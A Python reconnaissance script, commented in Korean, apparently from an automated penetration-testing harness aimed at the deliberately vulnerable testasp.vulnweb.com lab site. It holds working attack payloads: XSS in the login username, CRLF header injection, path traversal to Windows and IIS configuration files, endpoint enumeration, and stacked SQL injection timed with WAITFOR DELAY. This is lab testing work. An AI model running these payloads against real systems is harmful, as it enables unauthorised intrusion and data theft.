#!/usr/bin/env python3
"""Round 7 (phase 2) 읽기 전용 프로브.

항목:
  A. 세션 사용자명 미인코딩 출력 → XSS (로그인 폼, 쓰기 없음)
  B. RetURL CRLF/헤더 인젝션 (Response.Redirect)
  C. traversal 잔여 파일 (logInput.txt, 백업, IIS 설정)
  D. 미발견 .asp 엔드포인트 열거
  E. stacked query 가능성 (WAITFOR DELAY 타이밍)
"""
import os
import subprocess
import time
import urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r7"
EVI = f"{J}/evidence/r7"
os.makedirs(SCR, exist_ok=True)
os.makedirs(EVI, exist_ok=True)


def req(url, data=None, cookie=None, cookiejar=None, hdr_save=None, body_save=None,
        timeout=40, raw=None):
    """curl 실행 → (code, size, time_total, headers_text). -D/-o 분리 방식 고정."""
    hdr = hdr_save or f"{SCR}/_h.tmp"
    bod = body_save or f"{SCR}/_b.tmp"
    cmd = ["curl", "-s", "-S"] + PROXY + [
        "-m", str(timeout), "-D", hdr, "-o", bod,
        "-w", "%{http_code} %{size_download} %{time_total}"]
    if cookie:
        cmd += ["-b", cookie, "-c", cookie]
    if data is not None:
        cmd += ["-X", "POST", "--data", data]
    if raw:
        cmd += raw
    cmd.append(url)
    r = subprocess.run(cmd, capture_output=True, text=True)
    info = (r.stdout or "").strip() or "ERR " + (r.stderr or "").strip()[:120]
    parts = info.split()
    code, size, tt = (parts[0], parts[1], parts[2]) if len(parts) >= 3 else (info, "-", "-")
    try:
        hdrs = open(hdr, "rb").read().decode("latin-1")
    except OSError:
        hdrs = ""
    try:
        body = open(bod, "rb").read().decode("latin-1")
    except OSError:
        body = ""
    return code, size, tt, hdrs, body


def save(name, text):
    with open(f"{EVI}/{name}", "w", encoding="latin-1") as f:
        f.write(text)


def trav(item, label):
    """item(경로) → traversal 읽기. 반환 (code, size, body)."""
    url = f"{BASE}/Templatize.asp?item={urllib.parse.quote(item, safe='/')}"
    code, size, tt, hdrs, body = req(url)
    # 본문에서 실제 파일 내용만 뽑기: 파일 내용은 템플릿 안쪽 MainContentLeft 에 들어간다
    return code, size, body


# ---------------------------------------------------------------- A. 세션 사용자명 XSS
print("=" * 72)
print("A. 세션 사용자명 미인코딩 출력 (로그인 → 메뉴 반사)")
print("=" * 72)
JAR = f"{SCR}/loginxss.cookies"
if os.path.exists(JAR):
    os.remove(JAR)
payload = "<img src=x onerror=alert(document.domain)>' OR '1'='1'--"
# 세션 쿠키 확보(폼 GET) 후 POST
req(f"{BASE}/Login.asp", cookie=JAR)
data = "tfUName=" + urllib.parse.quote(payload) + "&tfUPass=x"
code, size, tt, hdrs, body = req(f"{BASE}/Login.asp", data=data, cookie=JAR,
                                 hdr_save=f"{SCR}/A_login.hdr")
print(f"[A1] POST /Login.asp tfUName={payload}")
print(f"     → {code} size={size} t={tt}")
for line in hdrs.splitlines():
    if line.lower().startswith(("http/", "location:")):
        print("     " + line.strip())
print(f"     로그인 실패 표시? {'Invalid login' in body}")

code, size, tt, hdrs, body = req(f"{BASE}/Default.asp", cookie=JAR,
                                 body_save=f"{SCR}/A_default_after.html")
print(f"[A2] GET /Default.asp (세션 쿠키 재사용) → {code} size={size}")
i = body.find("logout ")
if i >= 0:
    seg = body[i - 60:i + 140]
    print("     메뉴 원문: " + repr(seg))
    print("     RAW <img 태그 존재? " + str("<img src=x onerror=" in body))
    print("     HTML 인코딩(&lt;img)? " + str("&lt;img" in body))
    save("r7_A_session_username_xss.html", body)

# ---------------------------------------------------------------- B. CRLF/헤더 인젝션
print()
print("=" * 72)
print("B. RetURL CRLF / 헤더 인젝션")
print("=" * 72)
for label, returl in [
    ("crlf-lf", "/Default.asp%0d%0aSet-Cookie:%20splittest=1"),
    ("crlf-onlyLF", "/Default.asp%0aSet-Cookie:%20splittest2=1"),
    ("plain", "/Default.asp"),
]:
    jar2 = f"{SCR}/b_{label}.cookies"
    url = f"{BASE}/Login.asp?RetURL={returl}"
    code, size, tt, hdrs, body = req(
        url, data="tfUName=admin'--&tfUPass=x", cookie=jar2,
        hdr_save=f"{SCR}/B_{label}.hdr")
    injected = [l.strip() for l in hdrs.splitlines()
                if l.lower().startswith(("location:", "set-cookie:"))]
    print(f"[B-{label}] RetURL={returl}")
    print(f"     → {code}   헤더: {injected}")
save("r7_B_crlf_headers.txt", open(f"{SCR}/B_crlf-lf.hdr", "rb").read().decode("latin-1"))

# ---------------------------------------------------------------- C. traversal 잔여
print()
print("=" * 72)
print("C. traversal 잔여 파일")
print("=" * 72)
UP = "../" * 8
targets = [
    (UP + "scripts/logInput.txt", "logInput.txt (앱 로그)"),
    (UP + "scripts/", "scripts 디렉터리"),
    (UP + "Windows/System32/inetsrv/config/applicationHost.config", "IIS applicationHost.config"),
    (UP + "inetpub/wwwroot/web.config", "inetpub wwwroot web.config"),
    (UP + "boot.ini", "boot.ini"),
    (UP + "Windows/System32/drivers/etc/networks", "networks"),
    (UP + "Windows/win.ini", "win.ini (대조군)"),
    ("Default.asp.bak", "Default.asp.bak"),
    ("web.config.bak", "web.config.bak"),
    ("global.asa", "global.asa"),
    ("Templates/MainTemplate.dwt.asp", "Templates 템플릿"),
    ("html/about.html", "html/about.html (대조군)"),
    ("logInput.txt", "logInput.txt (앱 루트)"),
    ("../../../../../../../../Windows/System32/logfiles/", "logfiles"),
]
for item, label in targets:
    code, size, body = trav(item, label)
    snippet = ""
    if code == "200" and size not in ("0",):
        # 템플릿 골격 제거: 마지막 </html> 이후? → 앞부분 200자만
        snippet = " | " + " ".join(body[:400].split())[:180]
    print(f"[C] {label:34} {code:>4} {size:>7}{snippet}")

# ---------------------------------------------------------------- D. 엔드포인트 열거
print()
print("=" * 72)
print("D. 미발견 .asp 엔드포인트")
print("=" * 72)
cands = ["post.asp", "showposts.asp", "users.asp", "user.asp", "admin.asp", "edit.asp",
         "delete.asp", "upload.asp", "download.asp", "forum.asp", "thread.asp",
         "newthread.asp", "postmessage.asp", "profile.asp", "members.asp",
         "Search.asp.bak", "Default.asp.bak", "conn.asp", "config.asp", "include.asp",
         "header.asp", "footer.asp", "Templates/MainTemplate.dwt.asp", "Images/logo.gif"]
base_code, base_size, _, _, base_body = req(f"{BASE}/nonexistent_zzz.asp")
print(f"[D-기준] /nonexistent_zzz.asp → {base_code} size={base_size}")
for c in cands:
    code, size, tt, hdrs, body = req(f"{BASE}/{c}", timeout=20)
    flag = ""
    if code == "200" and c not in ("Templates/MainTemplate.dwt.asp", "Images/logo.gif"):
        flag = "  ← 200"
        save("r7_D_" + c.replace("/", "_") + ".html", body)
    print(f"[D] /{c:32} {code:>4} {size:>7}{flag}")

# ---------------------------------------------------------------- E. stacked query
print()
print("=" * 72)
print("E. stacked query 가능성 (WAITFOR DELAY 타이밍)")
print("=" * 72)
probes = [
    ("id=1", "기준선"),
    ("id=1 AND 1=1", "boolean 참 대조군"),
    ("id=1;WAITFOR DELAY '0:0:05'--", "stacked WAITFOR 5s"),
    ("id=1';WAITFOR DELAY '0:0:05'--", "stacked(따옴표) 5s"),
    ("id=1 AND 1=(SELECT 1)", "서브쿼리 대조군"),
]
for q, label in probes:
    code, size, tt, hdrs, body = req(f"{BASE}/showforum.asp?{urllib.parse.quote(q, safe='=()&')}",
                                     timeout=45)
    print(f"[E] {label:24} {q[:42]:44} → {code:>4} size={size:>7} t={tt}")

print()
print("done. scratch:", SCR)
